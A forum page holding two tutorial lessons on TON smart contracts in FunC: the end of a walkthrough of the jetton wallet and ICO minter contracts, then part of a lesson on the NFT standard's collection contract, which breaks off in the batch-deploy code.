Using these limits, we get a value for the message, which we will use later (send a message about the excess, if there is a lot).

Further, if we create a transfer notification message:

```
  if(forward_ton_amount) {
	msg_value -= (forward_ton_amount + fwd_fee);
	slice either_forward_payload = in_msg_body;

	var msg_body = begin_cell()
		.store_uint(op::transfer_notification(), 32)
		.store_uint(query_id, 64)
		.store_coins(jetton_amount)
		.store_slice(from_address)
		.store_slice(either_forward_payload)
		.end_cell();

	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; we should not bounce here cause receiver can have uninitialized contract
	  .store_slice(owner_address)
	  .store_coins(forward_ton_amount)
	  .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_ref(msg_body);

	send_raw_message(msg.end_cell(), 1);
  }
```

> It’s important to note that we’ve decremented `msg_value` again, we’ll need this later to know if we need to send a surplus message.

Now it’s time for `msg_value`, from which we persistently deducted various payments (you can read more about them [here](https://ton-blockchain.github.io/docs/#/smart-contracts/fees))

We check that the address is not null and that there is something left of `msg_value` and send a message about the surplus, with this surplus, respectively.

```
  if ((response_address.preload_uint(2) != 0) & (msg_value > 0)) {
	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 010000
	  .store_slice(response_address)
	  .store_coins(msg_value)
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(op::excesses(), 32)
	  .store_uint(query_id, 64);
	send_raw_message(msg.end_cell(), 2);
  }
```

And of course, at the very end there is data saving.

```
save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
```

Final code:

```
() receive_tokens (slice in_msg_body, slice sender_address, int my_ton_balance, int fwd_fee, int msg_value) impure {
  ;; NOTE we can not allow fails in action phase since in that case there will be
  ;; no bounce. Thus check and throw in computation phase.
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  balance += jetton_amount;
  slice from_address = in_msg_body~load_msg_addr();
  slice response_address = in_msg_body~load_msg_addr();
  throw_unless(707,
	  equal_slices(jetton_master_address, sender_address)
	  |
	  equal_slices(calculate_user_jetton_wallet_address(from_address, jetton_master_address, jetton_wallet_code), sender_address)
  );
  int forward_ton_amount = in_msg_body~load_coins();

  int ton_balance_before_msg = my_ton_balance - msg_value;
  int storage_fee = min_tons_for_storage() - min(ton_balance_before_msg, min_tons_for_storage());
  msg_value -= (storage_fee + gas_consumption());
  if(forward_ton_amount) {
	msg_value -= (forward_ton_amount + fwd_fee);
	slice either_forward_payload = in_msg_body;

	var msg_body = begin_cell()
		.store_uint(op::transfer_notification(), 32)
		.store_uint(query_id, 64)
		.store_coins(jetton_amount)
		.store_slice(from_address)
		.store_slice(either_forward_payload)
		.end_cell();

	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; we should not bounce here cause receiver can have uninitialized contract
	  .store_slice(owner_address)
	  .store_coins(forward_ton_amount)
	  .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_ref(msg_body);

	send_raw_message(msg.end_cell(), 1);
  }

  if ((response_address.preload_uint(2) != 0) & (msg_value > 0)) {
	var msg = begin_cell()
	  .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 010000
	  .store_slice(response_address)
	  .store_coins(msg_value)
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(op::excesses(), 32)
	  .store_uint(query_id, 64);
	send_raw_message(msg.end_cell(), 2);
  }

  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

##### [](#token-burning-function-incoming-transfer-28)Token burning function (incoming transfer)

We will not analyze the burning function in detail, since after reading the analyzes of the previous functions, everything should be clear at a glance.

I will only note the logic of work - after reducing the balance of tokens by the selected amount, a message is sent to the master contract - a notification of burning.

```
() burn_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
  ;; NOTE we can not allow fails in action phase since in that case there will be
  ;; no bounce. Thus check and throw in computation phase.
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  slice response_address = in_msg_body~load_msg_addr();
  ;; ignore custom payload
  ;; slice custom_payload = in_msg_body~load_dict();
  balance -= jetton_amount;
  throw_unless(705, equal_slices(owner_address, sender_address));
  throw_unless(706, balance >= 0);
  throw_unless(707, msg_value > fwd_fee + 2 * gas_consumption());

  var msg_body = begin_cell()
	  .store_uint(op::burn_notification(), 32)
	  .store_uint(query_id, 64)
	  .store_coins(jetton_amount)
	  .store_slice(owner_address)
	  .store_slice(response_address)
	  .end_cell();

  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(jetton_master_address)
	.store_coins(0)
	.store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_ref(msg_body);

  send_raw_message(msg.end_cell(), 64);

  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

#### [](#bounce-29)Bounce

There is one more function to write before we move on to `recv_internal()`. In the `recv_internal()` function, we have to handle bounced messages. (More about bounce on [page 78 here](https://ton-blockchain.github.io/docs/tblkch.pdf)).

When bouncing, we must do the following:

*   return tokens to the balance
*   throw an exception if `op::internal_transfer()` or `op::burn_notification()`

We will pass the body of the message to the function framework:

```
() on_bounce (slice in_msg_body) impure {

}
```

Take `op` from body and throw exceptions if `op::internal_transfer()` or `op::burn_notification()`

```
() on_bounce (slice in_msg_body) impure {
  in_msg_body~skip_bits(32); ;; 0xFFFFFFFF
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int op = in_msg_body~load_uint(32);
  throw_unless(709, (op == op::internal_transfer()) | (op == op::burn_notification()));

}
```

Continuing to read data from the body, we return the tokens to the balance and save the data to the `c4` register.

```
() on_bounce (slice in_msg_body) impure {
  in_msg_body~skip_bits(32); ;; 0xFFFFFFFF
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int op = in_msg_body~load_uint(32);
  throw_unless(709, (op == op::internal_transfer()) | (op == op::burn_notification()));
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  balance += jetton_amount;
  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

#### [](#recv_internal-30)recv\_internal()

In order for our wallet to receive messages, we will use the external method `recv_internal()`

```
() recv_internal()  {

}
```

##### [](#external-method-arguments-31)External method arguments

According to the documentation of the [TON virtual machine - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), when an event occurs on an account in one of the TON chains, it triggers a transaction.

Each transaction consists of up to 5 stages. Read more [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

We are interested in **Compute phase**. And to be more specific, what is “on the stack” during initialization. For normal message-triggered transactions, the initial state of the stack looks like this:

5 elements:

*   Smart contract balance (in nanoTons)
*   Incoming message balance (in nanotones)
*   Cell with incoming message
*   Incoming message body, slice type
*   Function selector (for recv\_internal it is 0)

As a result, we get the following code:

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#get-data-from-message-body-32)Get data from message body

So the first thing we do in `recv_internal()` is check if the message is empty:

if (in\_msg\_body.slice\_empty?()) { ;; ignore empty messages  
return ();  
}

Next, we get the flags and check if the incoming message is a bounced one. In case it’s a bounce, we’ll use the `on_bounce()` function we wrote earlier.

```
  slice cs = in_msg_full.begin_parse();
  int flags = cs~load_uint(4);
  if (flags & 1) {
	on_bounce(in_msg_body);
	return ();
  }
```

After we continue to get the data (comments reveal what it is), including `op`. Thanks to which we will build further logic.

```
  slice sender_address = cs~load_msg_addr();
  cs~load_msg_addr(); ;; skip dst
  cs~load_coins(); ;; skip value
  cs~skip_bits(1); ;; skip extracurrency collection
  cs~load_coins(); ;; skip ihr_fee
  int fwd_fee = cs~load_coins(); ;; we use message fwd_fee for estimation of forward_payload costs

  int op = in_msg_body~load_uint(32);
```

Using conditional statements, we build logic around `op` and use the functions we wrote to implement the logic inside.

```
  if (op == op::transfer()) { ;; outgoing transfer
	send_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }

  if (op == op::internal_transfer()) { ;; incoming transfer
	receive_tokens(in_msg_body, sender_address, my_balance, fwd_fee, msg_value);
	return ();
  }

  if (op == op::burn()) { ;; burn
	burn_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }
```

There is an exception at the end, i.e. if the contract does not take some action according to `op`, an exception will be thrown. Final `recv_internal()` code:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
  if (in_msg_body.slice_empty?()) { ;; ignore empty messages
	return ();
  }

  slice cs = in_msg_full.begin_parse();
  int flags = cs~load_uint(4);
  if (flags & 1) {
	on_bounce(in_msg_body);
	return ();
  }
  slice sender_address = cs~load_msg_addr();
  cs~load_msg_addr(); ;; skip dst
  cs~load_coins(); ;; skip value
  cs~skip_bits(1); ;; skip extracurrency collection
  cs~load_coins(); ;; skip ihr_fee
  int fwd_fee = cs~load_coins(); ;; we use message fwd_fee for estimation of forward_payload costs

  int op = in_msg_body~load_uint(32);

  if (op == op::transfer()) { ;; outgoing transfer
	send_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }

  if (op == op::internal_transfer()) { ;; incoming transfer
	receive_tokens(in_msg_body, sender_address, my_balance, fwd_fee, msg_value);
	return ();
  }

  if (op == op::burn()) { ;; burn
	burn_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }

  throw(0xffff);
}
```

####Get method

According to the [Jetton](https://github.com/ton-blockchain/TIPs/issues/74) standard, a wallet smart contract must implement a Get method that returns:

```
`balance` - (uint256) number of tokens in the wallet.
`owner` - (MsgAddress) wallet owner address;
`jetton` - (MsgAddress) address of the master contract;
`jetton_wallet_code` - (cell) with the code of this wallet;
```

That is, just unload data from `c4`:

```
(int, slice, slice, cell) get_wallet_data() method_id {
  return load_data();
}
```

## [](#jetton-minter-icofc-33)jetton-minter-ICO.fc

This file is a variation of the master contract, for the situation when you want to conduct an ICO.

> ICO (Initial Coin Offering) - initial placement of coins, a form of attracting investments in the form of selling investors a fixed number of new units of crypto-currencies / tokens.

The only significant difference from jetton-minter.fc is the ability to get tokens for yourself by sending a Tone to a contract.

Also, the optional `op` that were in jetton-minter.fc was removed from this particular contract.

## [](#jetton-minter-icofc-34)jetton-minter-ICO.fc

This file is a variation of the master contract, for the situation when you want to conduct an ICO.

> ICO (Initial Coin Offering) - initial placement of coins, a form of attracting investments in the form of selling investors a fixed number of new units of crypto-currencies / tokens.

The only significant difference from jetton-minter.fc is the ability to get tokens for yourself by sending a Tone to a contract.

Also, the optional `op` that were in jetton-minter.fc was removed from this particular contract.

##### [](#understanding-ico-mechanics-in-recv_internal-35)Understanding ICO mechanics in recv\_internal()

The balance of the incoming message (in nanoTons) is `msg_value`. From this we will subtract a small number of NanoTons for the minting message and the resulting value will be exchanged for Jetton Standards tokens in some proportion.

Check that the body of the message is not empty:

```
if (in_msg_body.slice_empty?()) { ;; buy jettons for Toncoin


}
```

Calculate the number of nanoTons to be exchanged for Jetton standard tokens:

```
  int amount = 10000000; ;; for mint message
  int buy_amount = msg_value - amount;
```

Let’s check that the result is not a negative value, we will throw an exception if it is the other way around:

```
throw_unless(76, buy_amount > 0);
```

Set the proportion:

```
int jetton_amount = buy_amount; ;; rate 1 jetton = 1 toncoin; multiply to price here
```

Next, we collect a message for the `mint_tokens()` function:

```
  var master_msg = begin_cell()
        .store_uint(op::internal_transfer(), 32)
        .store_uint(0, 64) ;; quert_id
        .store_coins(jetton_amount)
        .store_slice(my_address()) ;; from_address
        .store_slice(sender_address) ;; response_address
        .store_coins(0) ;; no forward_amount
        .store_uint(0, 1) ;; forward_payload in this slice, not separate cell
        .end_cell();
```

We call the function of minting tokens:

```
mint_tokens(sender_address, jetton_wallet_code, amount, master_msg);
```

We also save data to the `c4` register, changing the total supply of Jetton standard tokens. And we finish the execution of the `recv_internal function()`.

```
save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code);
return ();
```

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/9lesson/ninthlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/9lesson/ninthlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/9lesson/ninthlesson.md)

```
# Урок 9 Jettons - TON fungible tokens

## Foreword - why tokens and standards are needed

#### What is a token

A token is a unit of account for some digital asset in some network. It is important to note that a token does not usually mean a cryptocurrency, but a record distributed on a blockchain that is managed using smart contracts. The smart contract contains the values of balances on the accounts of token holders, and the smart contract also provides the ability to transfer tokens from one account to another.

#### What is a fungible and nonfungible token?

One of the possible classifications of tokens is the classification by fungibility.

**Fungible Tokens** are assets that are not unique and can be easily exchanged for another asset of the same type. Such tokens are made in such a way that each token is equivalent to the next token.

**Non-fungible tokens** are assets, each instance of which is unique (specific) and cannot be replaced by another similar asset. A non-fungible token is some kind of digital object certificate with the ability to transfer the certificate through some mechanism.

#### Why do we need a token standard and what is it

In order for tokens to be used in other applications (from wallets to decentralized exchanges), smart contract interface standards for tokens are being introduced.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/9lesson/ninthlesson.md)

  1 Like

[Howard](https://tonresear.ch/u/Howard) September 9, 2024, 2:20pm  2

Good job.

This is the incredible article! Thanks for sharing!!

 

[nikitaNotFound](https://tonresear.ch/u/nikitaNotFound) October 19, 2024, 11:12pm  3

![](https://tonresear.ch/user_avatar/tonresear.ch/simpson/48/85_2.png) Simpson:

> ```
> slice calculate_jetton_wallet_address(cell state_init) inline {
>   return begin_cell().store_uint(4, 3)
> 					 .store_int(workchain(), 8)
> 					 .store_uint(cell_hash(state_init), 256)
> 					 .end_cell()
> 					 .begin_parse();
> }
> ```

Nice article. But why store\_uint(4, 3) is used for AnycastInfo when building address?

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 436

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 10 NFT Standard](/t/create-smart-contracts-on-ton-lesson-10-nft-standard/436)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:51pm  1

In lesson 9, we discussed that there is a division of tokens into non-fungible and fungible ones, as well as what the standard of fungible tokens looks like, in this lesson we will discuss non-fungible tokens and analyze examples according to the standard.

## [](#what-is-the-nft-standard-in-ton-1)What is the NFT standard in TON

So, non-fungible tokens are assets, each instance of which is unique (specific) and cannot be replaced by another similar asset. A non-fungible token is some kind of digital entity certificate with the ability to transfer the certificate through some mechanism.

[NFT standard in TON](https://github.com/ton-blockchain/TIPs/issues/62) describes:

*   Change of form of ownership.
*   A way to combine items in a collection.
*   Method of deduplication of the common part of the collection.

> Deduplication - a method of eliminating duplicate copies, repetitive data

As for Jetton, the NFT standard has a master contract - a collection contract and smart contracts for an individual NFT in a collection. There is a great example in the standard: If you release a collection containing 10,000 items, then you deploy 10,001 smart contracts, one collection contract, and 10,000 contracts for each item.

> The NFT standard also explains why exactly this NFT implementation scheme was chosen, with so many contracts, the item is Rationale and the next one.

There are extensions in TON for the [NFT standard](https://github.com/ton-blockchain/TIPs/issues/62) (as of 07/29/2022, some of them are in Drafts):

*   [NFTRoyalty](https://github.com/ton-blockchain/TIPs/issues/66) - about how to get royalty information and provide universal support for royalty payments across all NFT marketplaces and ecosystem members.
*   [NFTBounceable](https://github.com/ton-blockchain/TIPs/issues/67) - a way to rollback NFT transfers if the recipient dismissed the notification. (For example, if the NFT was sent to the wrong address and the recipient’s smart contract does not know how to interact with the NFT.)
*   [NFTEditable](https://github.com/ton-blockchain/TIPs/issues/68) - about NFT bulk changes
*   [NFTUpgradable](https://github.com/ton-blockchain/TIPs/issues/69) - about scalable NFTs

#### [](#functionality-of-contracts-according-to-the-nft-standard-2)Functionality of contracts according to the NFT standard

The standard describes two key smart contracts for NFTs:

*   collection smart contract
*   smart contract for a separate NFT

> In [examples](https://github.com/ton-blockchain/token-contract/tree/main/nft) there is also a smart contract that implements the sale and some kind of marketplace, but in this lesson we will not analyze these contracts , let’s focus on the NFT standard.

Collection smart contract should implement:

*   deployment (deploy) of smart contracts of NFT elements of this collection. (in the example that we will analyze, there will be both a single NFT deployment and a mass NFT deployment)
*   Get-method `get_collection_data()` , which will return the address of the owner of the collection, the content of the collection, and the counter of current NFTs in the collection
*   Get-method `get_nft_address_by_index(int ​​index)`, which, by the number of the NFT element of this collection, returns the address (`MsgAddress`) of the smart contract of this NFT element
*   Get-method `get_nft_content(int index, cell individual_content)`, which returns information on a specific NFT in the collection

A smart contract for a separate NFT must implement:

*   Get-method `get_nft_data()`, which will return data for this NFT
*   transfer of NFT ownership
*   internal method `get_static_data`, to get data about a particular NFT by internal message.

> Important: the standard also describes many nuances regarding commissions, restrictions, and other things, but we will not dwell on this in too much detail so that the lesson does not turn into a book.

#### [](#metadata-for-the-nft-standard-3)Metadata for the NFT standard

*   `uri` - optional parameter, link to JSON document with metadata.
*   `name` - NFT identifier string, i.e. identifies the asset.
*   `description` - asset description.
*   `image` is a URI pointing to a MIME-type image resource.
*   `image_data` - Either the binary representation of the image for the web layout, or base64 for the offline layout.

## [](#parsing-the-code-4)Parsing the code

Before parsing the code, I will note that in general the “mechanics” are repeated, so the further into the analysis, the more top-level the analysis will be.

We will parse files from the [repository](https://github.com/ton-blockchain/token-contract/tree/main/nft) in the following order:

*   nft-collection.fc
*   nft-item.fc

## [](#nft-collectionfc-5)nft-collection.fc

The collection contract starts with two helper functions, for loading and unloading data.

##### [](#loading-and-unloading-data-from-c4-6)Loading and unloading data from c4

The “collection contract store” will store:

*   `owner_address` - address of the owner of the collection, if there is no owner, then the zero address
*   `next_item_index` is the number of currently deployed NFT items in the collection\*.
*   `content` - content of the collection in the format corresponding to the [token](https://github.com/ton-blockchain/TIPs/issues/64) standard .
*   `nft_item_code` - code of a separate NFT, will be used to “reproduce” the address of the smart contract.
*   `royalty_params` - royalty parameters

> *   *   If the value of `next_item_index` is -1, then this is an inconsistent collection, such collections must provide their own way of generating an index/enumeration of items.

Let’s write help functions `load_data()` and `save_data()` that will unload and load data from register c4. (We will not analyze loading and unloading in detail, since similar functionality has been analyzed many times in previous lessons).

##### [](#reproductionrecreation-functions-7)“Reproduction/Recreation” functions

In this smart contract, we need to reproduce the address of the smart contract with a separate NFT of this owner at the address of the owner. To do this, we will use the same “trick” as in the Jetton examples.

Let me remind you, if we study the [documentation](https://ton-blockchain.github.io/docs/#/howto/step-by-step?id=_3-compiling-a-new-smart-contract) of how a smart contract is compiled .

We can see the following:

The code and data for the new smart contract are concatenated into a StateInit structure (on the following lines), the address of the new smart contract (equal to the hash of this StateInit structure) is computed and output, and then an external message is generated with a destination address equal to the address of the new smart contract. This outer message contains both the correct StateInit for the new smart contract and a non-trivial payload (signed with the correct private key).

For us, this means that we can get the address of the smart contract of a separate NFT using `item_index` and the smart contract code of a separate NFT, we will collect the StateInit of the wallet.

This is possible because the [hashing](https://en.wikipedia.org/wiki/Hash_function) are deterministic, which means that there will be a different hash for different inputs,  
at the same time, for the same input data, the hash function will always return a uniform hash.

To do this, the smart contract has the `calculate_nft_item_state_init()` and `calculate_nft_item_address()` functions:

```
cell calculate_nft_item_state_init(int item_index, cell nft_item_code) {
  cell data = begin_cell().store_uint(item_index, 64).store_slice(my_address()).end_cell();
  return begin_cell().store_uint(0, 2).store_dict(nft_item_code).store_dict(data).store_uint(0, 1).end_cell();
}

slice calculate_nft_item_address(int wc, cell state_init) {
  return begin_cell().store_uint(4, 3)
					 .store_int(wc, 8)
					 .store_uint(cell_hash(state_init), 256)
					 .end_cell()
					 .begin_parse();
}
```

The `calculate_nft_item_state_init()` function collects the StateInit according to the given `item_index`.

The `calculate_nft_item_address()` function collects the address according to the [TL-B scheme](https://github.com/ton-blockchain/ton/blob/master/crypto/block/block.tlb#L99).

> the function `cell_hash()` is used to calculate the hash - it calculates the hash of the cell representation.

##### [](#auxiliary-function-for-deploying-a-single-nft-8)Auxiliary function for deploying a single NFT

> \*Deploy - the process of transferring to the network (in this case, a separate NFT)

To deploy NFT, we will need to send the necessary information on NFT to the address of the smart contract, respectively:

*   reproduce the address of the smart contract of a separate NFT
*   send information by message

Smart contract address:

```
	() deploy_nft_item(int item_index, cell nft_item_code, int amount, cell nft_content) impure {
	  cell state_init = calculate_nft_item_state_init(item_index, nft_item_code);
	  slice nft_address = calculate_nft_item_address(workchain(), state_init);

	}
```

workchain() is a helper function from `params.fc`. It is defined as a low-level TVM primitive using the `asm` keyword.

int workchain() asm “0 PUSHINT”;

Number 0 is the base vorchain.

We send information by message:

```
() deploy_nft_item(int item_index, cell nft_item_code, int amount, cell nft_content) impure {
  cell state_init = calculate_nft_item_state_init(item_index, nft_item_code);
  slice nft_address = calculate_nft_item_address(workchain(), state_init);
  var msg = begin_cell()
			.store_uint(0x18, 6)
			.store_slice(nft_address)
			.store_coins(amount)
			.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
			.store_ref(state_init)
			.store_ref(nft_content);
  send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
}
```

##### [](#helper-function-for-sending-royalties-parameters-9)Helper function for sending Royalties parameters

This helper function will send static royalty data in the case of an internal message to `recv_internal()`.

Technically, everything is simple here, we send a message with the `op` code `op::report_royalty_params()` :

```
() send_royalty_params(slice to_address, int query_id, slice data) impure inline {
  var msg = begin_cell()
	.store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
	.store_slice(to_address)
	.store_coins(0)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_uint(op::report_royalty_params(), 32)
	.store_uint(query_id, 64)
	.store_slice(data);
  send_raw_message(msg.end_cell(), 64); ;; carry all the remaining value of the inbound message
}
```

#### [](#recv_internal-10)recv\_internal()

In order for our wallet to receive messages, we will use the external method `recv_internal()`

```
() recv_internal()  {

}
```

The external method of our collection smart contract should implement:

*   sending royalty parameters
*   deployment of a separate NFT
*   deploy several NFTs at once (batch deploy)
*   change of owner
*   as well as a large number of exceptions that check the logic of work)

##### [](#external-method-arguments-11)External method arguments

According to the documentation of the [TON virtual machine - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), when an event occurs on an account in one of the TON chains, it triggers a transaction.

Each transaction consists of up to 5 stages. Read more [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

We are interested in **Compute phase**. And to be more specific, what is “on the stack” during initialization. For normal message-triggered transactions, the initial state of the stack looks like this:

5 elements:

*   Smart contract balance (in nanoTons)
*   Incoming message balance (in nanotones)
*   Cell with incoming message
*   Incoming message body, slice type
*   Function selector (for recv\_internal it is 0)

As a result, we get the following code:

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#build-the-skeleton-of-the-external-method-12)Build the skeleton of the external method

So the first thing we do in `recv_internal()` is check if the message is empty:

```
  if (in_msg_body.slice_empty?()) { ;; ignore empty messages
	return ();
  }
```

Next, we get the flags and check if the incoming message is a bounced one. If this is a bounce, we complete the function:

```
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
```

Next, we get the sender address, as well as `op` and `query_id`:

```
slice sender_address = cs~load_msg_addr();
int op = in_msg_body~load_uint(32);
int query_id = in_msg_body~load_uint(64);
```

Unload data from register `c4`:

```
var (owner_address, next_item_index, content, nft_item_code, royalty_params) = load_data();
```

Using the previously described function for transferring information on royalties, we send this information:

```
if (op == op::get_royalty_params()) {
    send_royalty_params(sender_address, query_id, royalty_params.begin_parse());
    return ();
}
```

Next, there will be functionality that is available only to the owner of the collection (NFT release, etc.), so we will check the address and throw an exception if this is not the case:

```
throw_unless(401, equal_slices(sender_address, owner_address));
```

With the help of conditional statements and `op`, further smart contract logic is created:

```
if (op == 1) { ;; deploy new nft

}
if (op == 2) { ;; batch deploy of new nfts

}
if (op == 3) { ;; change owner

}
throw(0xffff);
```

There is an exception at the end, i.e. if the contract does not take some action according to `op`, an exception will be thrown. Final framework `recv_internal()`:

```
() recv_internal(cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	var (owner_address, next_item_index, content, nft_item_code, royalty_params) = load_data();

	if (op == op::get_royalty_params()) {
		send_royalty_params(sender_address, query_id, royalty_params.begin_parse());
		return ();
	}

	throw_unless(401, equal_slices(sender_address, owner_address));


	if (op == 1) { ;; deploy new nft

	}
	if (op == 2) { ;; batch deploy of new nfts

	}
	if (op == 3) { ;; change owner

	}
	throw(0xffff);
}
```

##### [](#op-1-deploy-nft-13)op == 1 Deploy NFT

We get the index of a separate NFT from the message body:

```
if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);

  return();
}
```

We check that the index is not greater than the following index, unloaded from c4:

```
if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);
  throw_unless(402, item_index <= next_item_index);

  }
  return();
}
```

Let’s add the `is_last` variable, which we will use for checking, and also change the value of `item_index` to `next_item_index`.

Immediately after that, we will use the helper function for the NFT deployment:

```
 if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);
  throw_unless(402, item_index <= next_item_index);
  var is_last = item_index == next_item_index;
  deploy_nft_item(item_index, nft_item_code, in_msg_body~load_coins(), in_msg_body~load_ref());

}
```

Now it remains to store the data in the `c4` register, check `is_last`, add one to the `next_item_index` counter and save the data in `c4`.

```
 if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);
  throw_unless(402, item_index <= next_item_index);
  var is_last = item_index == next_item_index;
  deploy_nft_item(item_index, nft_item_code, in_msg_body~load_coins(), in_msg_body~load_ref());
  if (is_last) {
    next_item_index += 1;
    save_data(owner_address, next_item_index, content, nft_item_code, royalty_params);
  }
  return();
}
```

Finally, we end the function with `return ()`.

##### [](#op-2-batch-nft-deploy-14)op == 2 Batch NFT deploy

Mass deployment is just an NFT deployment in a loop, the loop will go through a dictionary, the data for which we will simply unload from the message body (a link to the beginning of the dictionary, in simple terms).

> In detail on working with dictionaries (Hashmaps) we stopped in the seventh lesson

I also consider it important to note that the “one-time” mass deployment in TON is limited. In [TVM](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=tvm-is-stack-machine), the number of output actions in a single transaction must be `<=255`.

> Let me remind you that FunС has three [loops](https://ton-blockchain.github.io/docs/#/func/statements?id=loops): `repeat`,`until`,`while`

Let’s create a counter `counter`, which we will use in the loop, and also upload a link to the NFT list.

```
	if (op == 2) { ;; batch deploy of new nfts
	  int counter = 0;
	  cell deploy_list = in_msg_body~load_ref();

	}
```

Next, we have to use the `udict::delete_get_min(cell dict, int key_len)` function - calculates the minimum key `k` in the `dict` dictionary, deletes it and returns (dict’, x, k, -1), where `dict '` is a modified version of `dict` and x is the value associated with `k`. If `dict` is empty, returns (dict, null, null, 0). The last value is -1, this is a flag, if the function returns a modified dictionary, then the flag is -1, if not, then 0. We will use the flag as a loop condition

So, let’s denote a loop, and using `udict::delete_get_min(cell dict, int key_len)` we will get the NFT values for deployment.

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
   
  } until ( ~ f?);
}
```

> ~ - bitwise not ? - conditional operator

Let’s check the flag (i.e. there is something to work with), immediately after the check we increase the counter `counter`, which we defined earlier. We do this in order to check the condition that the number of NFT units during mass deployment does not go beyond the limits of TVM (I wrote about this above).

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
    if (f?) {
      counter += 1;
      if (counter >= 250) { ;; Limit due to limits of action list size
        throw(399);
      }
	  
  } until ( ~ f?);
}
```

We also check that there is no confusion with indices, that is, the current index is not greater than the next one. And after that, let’s deploy NFT. Additionally, we will handle the situation if the number of the current NFT is equal to the next one by adding one.

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
    if (f?) {
      counter += 1;
      if (counter >= 250) { ;; Limit due to limits of action list size
        throw(399);
      }

      throw_unless(403 + counter, item_index <= next_item_index);
      deploy_nft_item(item_index, nft_item_code, item~load_coins(), item~load_ref());
      if (item_index == next_item_index) {
        next_item_index += 1;
      }
    }
  } until ( ~ f?);

}
```

At the very end, it remains to save the data and finish the function. Final code `op` == 2.

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
    if (f?) {
      counter += 1;
      if (counter >= 250) { ;; Limit due to limits of action list size
        throw(399);
      }

